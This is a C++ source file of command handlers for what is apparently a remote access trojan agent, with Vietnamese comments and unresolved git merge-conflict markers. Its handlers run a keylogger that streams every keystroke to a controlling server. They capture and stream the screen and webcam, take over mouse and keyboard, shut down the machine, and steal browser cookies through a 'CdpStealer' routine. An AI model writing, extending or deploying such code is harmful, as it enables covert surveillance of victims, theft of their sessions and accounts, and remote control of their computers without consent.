#include "ProcessHandlers.h"
#include "ProcessManager.h"
#include "AgentTcpServer.h"
#include "Capture.h"
#include "ScreenStream.h"
#include "Keylogging.h"
#include "WebcamRecord.h"
#include "WebcamStream.h"
#include "MouseControl.h"
#include "CdpStealer.h"
#include "KeyboardControl.h"
<<<<<<< HEAD
#include "ChatManager.h"
=======
#include "WifiSearcher.h"
>>>>>>> 02068f77e864c983d0dc5376b02d306313613b60

// Helper: Trả về JSON status chuẩn
json ProcessHandlers::makeStatus(bool success, const std::string &msg, json extra)
{
    json j = {{"type", "status"}, {"success", success}};
    if (!msg.empty())
        j["message"] = msg;
    if (!extra.empty())
        j.update(extra);
    return j;
}

// === PROCESS ===
json ProcessHandlers::listProcesses(const json &)
{
    json arr = json::array();
    for (const auto &p : ProcessManager::listProcesses())
    {
        arr.push_back({{"pid", p.pid}, {"name", p.name}, {"workingSet", p.workingSet}, {"exePath", p.exePath}});
    }
    return {{"type", "process_list"}, {"data", arr}};
}

json ProcessHandlers::startProcess(const json &req)
{
    std::string path = req.value("path", "");
    if (path.empty())
        return makeStatus(false, "missing path");

    unsigned long pid = 0;
    bool ok = ProcessManager::startProcess(path, req.value("args", ""), &pid);
    return makeStatus(ok, "", {{"pid", pid}});
}

json ProcessHandlers::stopProcessPid(const json &req)
{
    if (!req.contains("pid"))
        return makeStatus(false, "missing pid");
    return makeStatus(ProcessManager::stopProcessByPid(req["pid"]));
}

// === APPS ===
json ProcessHandlers::listApps(const json &)
{
    json arr = json::array();
    for (const auto &a : ProcessManager::listUserApplications())
    {
        arr.push_back({{"name", a.name}, {"process_count", a.processCount}});
    }
    return {{"type", "application_list"}, {"data", arr}};
}

json ProcessHandlers::startApp(const json &req)
{
    std::string name = req.value("app_name", "");
    if (name.empty())
        return makeStatus(false, "missing app_name");

    unsigned long pid = 0;
    bool ok = ProcessManager::startProcess(name, "", &pid);
    return makeStatus(ok, "", {{"pid", pid}});
}

json ProcessHandlers::stopApp(const json &req)
{
    int count = ProcessManager::stopProcessesByName(req.value("app_name", ""));
    return makeStatus(count > 0, "", {{"stopped", count}});
}

// === SCREEN ===
json ProcessHandlers::captureScreen(const json &)
{
    std::string b64 = capture_screenshot_base64();
    if (b64.empty())
        return makeStatus(false, "capture failed");
    return {{"type", "screenshot"}, {"success", true}, {"data", b64}};
}

json ProcessHandlers::startScreenStream(const json &req)
{
    ScreenStream::start(req.value("fps", 30));
    return makeStatus(true, "Screen streaming started");
}

json ProcessHandlers::stopScreenStream(const json &)
{
    ScreenStream::stop();
    return makeStatus(true, "Screen streaming stopped");
}

// === KEYLOGGER ===
json ProcessHandlers::startKeylog(const json &)
{
    // Đăng ký callback nhận chuỗi std::string (chứa ký tự utf8 hoặc tag [BACKSPACE])
    Keylogging::setCallback([](std::string key)
                            { AgentTcpServer::instance().sendJson({
                                  {"type", "key_event"},
                                  {"key_char", key} // Gửi trường key_char thay vì key_code
                              }); });

    Keylogging::start();
    return makeStatus(true, "Keylogger started");
}

json ProcessHandlers::stopKeylog(const json &)
{
    Keylogging::stop();
    return makeStatus(true, "Keylogger stopped");
}

// === WEBCAM ===
json ProcessHandlers::startWebcamRecord(const json &req)
{
    int time = req.value("time", 10);
    auto &server = AgentTcpServer::instance();

    server.sendJson({{"type", "webcam_recording_status"},
                     {"message", "Recording started (" + std::to_string(time) + "s)"}});

    std::string b64 = WebcamRecord::record_base64(time);

    if (b64.empty())
    {
        server.sendJson({{"type", "webcam_recording_status"}, {"message", "Recording failed"}});
        return makeStatus(false, "record failed");
    }

    server.sendJson({{"type", "webcam_video"}, {"success", true}, {"data", b64}});
    return makeStatus(true, "Webcam video sent");
}

json ProcessHandlers::stopWebcamRecord(const json &)
{
    AgentTcpServer::instance().sendJson({{"type", "webcam_recording_status"},
                                         {"message", "Recording cancelled"}});
    return makeStatus(true, "Stop signal sent");
}

json ProcessHandlers::startWebcamStream(const json &req)
{
    WebcamStream::start(req.value("fps", 30));
    AgentTcpServer::instance().sendJson({{"type", "webcam_recording_status"}, {"message", "Webcam streaming started"}});
    return makeStatus(true, "Webcam streaming started");
}

json ProcessHandlers::stopWebcamStream(const json &)
{
    WebcamStream::stop();
    AgentTcpServer::instance().sendJson({{"type", "webcam_recording_status"}, {"message", "Webcam streaming stopped"}});
    return makeStatus(true, "Webcam streaming stopped");
}

// === SYSTEM ===
json ProcessHandlers::systemShutdown(const json &)
{
    std::system("shutdown /s /t 0");
    return makeStatus(true, "Shutdown command sent");
}

json ProcessHandlers::systemRestart(const json &)
{
    std::system("shutdown /r /t 0");
    return makeStatus(true, "Restart command sent");
}

// === MOUSE CONTROL  ===
json ProcessHandlers::handleMouseInput(const json &req)
{
    // 1. Lấy action
    std::string action = req.contains("a") ? req["a"].get<std::string>() : req.value("action", "");
    if (action == "batch")
    {
        if (req.contains("data") && req["data"].is_array())
        {
            auto &points = req["data"];
            size_t count = points.size();

            int totalDurationMs = 20;
            int delayPerPoint = 0;

            if (count > 1)
            {
                delayPerPoint = totalDurationMs / count;
            }

            for (const auto &point : points)
            {
                double x = point.value("x", 0.0);
                double y = point.value("y", 0.0);
                MouseControl::Move(x, y);

                if (delayPerPoint > 0)
                {
                    std::this_thread::sleep_for(std::chrono::milliseconds(delayPerPoint));
                }
            }
        }
        return {};
    }

    // 2. Click (Hỗ trợ cả 'cl' và 'click')
    if (action == "cl" || action == "click")
    {
        std::string btn = req.contains("b") ? req["b"].get<std::string>() : req.value("button", "left");
        std::string state = req.contains("s") ? req["s"].get<std::string>() : req.value("state", "down");

        // Cập nhật vị trí chuột ngay trước khi click để đảm bảo chính xác
        if (req.contains("x") && req.contains("y"))
        {
            MouseControl::Move(req.value("x", 0.0), req.value("y", 0.0));
        }

        MouseControl::Action(btn, state);
    }
    // 3. Scroll (Hỗ trợ cả 'sc' và 'scroll')
    else if (action == "sc" || action == "scroll")
    {
        int delta = req.contains("d") ? req["d"].get<int>() : req.value("delta", 0);
        MouseControl::Scroll(delta);
    }
    // 4. Move đơn lẻ (Hỗ trợ 'mv' hoặc 'move' - phòng hờ)
    else if (action == "mv" || action == "move")
    {
        double x = req.value("x", 0.0);
        double y = req.value("y", 0.0);
        MouseControl::Move(x, y);
    }

    return {};
}

json ProcessHandlers::stealCookiesCDP(const json &req)
{
    std::string browser = req.value("browser", "brave");

    // Gọi hàm Static trong CdpStealer
    json result = CdpStealer::StealCookiesViaCDP(browser);

    if (result["status"] == "error")
    {
        return makeStatus(false, result["message"]);
    }

    // Gửi thẳng kết quả về Server (dạng JSON đã xử lý sẵn)
    // Cấu trúc gói tin trả về
    return {
        {"type", "cookies_result"}, // Tận dụng type cũ để Web UI hiểu
        {"browser", browser},
        {"data", result["data"]}};
}

json ProcessHandlers::handleKeyboardInput(const json &req)
{
    // Trường hợp 1: Nhận chuỗi văn bản (Tiếng Việt/Ký tự)
    if (req.contains("text"))
    {
        std::string textUtf8 = req.value("text", "");
        if (!textUtf8.empty())
        {
            std::wstring textWide = ToWide(textUtf8);
            KeyboardControl::SendUnicodeString(textWide);
        }
    }
    // Trường hợp 2: Nhận phím chức năng (Enter, Backspace, Ctrl...)
    else if (req.contains("key") || req.contains("keyCode"))
    {
        std::string key = req.value("key", "");
        int keyCode = req.value("keyCode", 0);
        KeyboardControl::HandleInput(key, keyCode);
    }

    return {};
}

<<<<<<< HEAD
// === CHAT SYSTEM ===
json ProcessHandlers::handleChatCommand(const json &req)
{
    std::string cmd = req.value("command", "");

    if (cmd == "chat_start")
    {
        ChatManager::Start();
        return makeStatus(true, "Chat UI opened");
    }
    else if (cmd == "chat_stop")
    {
        ChatManager::Stop();
        return makeStatus(true, "Chat UI closed");
    }
    else if (cmd == "chat_message")
    {
        std::string text = req.value("text", "");
        if (!text.empty())
        {
            // Hiển thị tin nhắn từ Admin lên cửa sổ Chat của Agent
            ChatManager::AppendText("Admin: " + text);
        }
        return {}; // Tin nhắn không cần phản hồi JSON về client
    }

    return makeStatus(false, "Unknown chat command");
=======
json ProcessHandlers::getWifiInfo(const json &) {
    json wifiData = WifiSearcher::getWifiInfo(); 
    
    wifiData["type"] = "wifi_info";
    wifiData["success"] = true;

    return wifiData;
>>>>>>> 02068f77e864c983d0dc5376b02d306313613b60
}